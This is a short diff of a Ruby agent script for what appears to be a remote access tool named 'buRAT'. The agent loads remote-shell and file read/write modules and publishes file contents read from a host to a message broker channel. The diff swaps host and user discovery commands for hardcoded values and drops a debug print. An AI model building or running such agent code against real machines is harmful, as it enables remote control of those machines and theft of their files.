@@ -7,9 +7,9 @@ require_relative "inators/remote_shell"
 require_relative "inators/file_rw"
 
 agent = {
-	id: SecureRandom.uuid,
-	host: `uname -a`,
-	user: `whoami`,
+	id: SecureRandom.hex(2),
+	host: "buRAT 1.0",
+	user: "reedleoneil",
 	inators: [
 		:remote_shell,
 		:file_rw
@@ -115,7 +115,6 @@ frw_inator.on :read do |file, length, offset, data|
 		offset: offset,
 		data: data
 	}
-	puts packet[:data]
 	client.publish("/bu/agents/#{agent[:id]}/inators/file_rw/events/read", packet.to_msgpack, false, 1)
 end
 
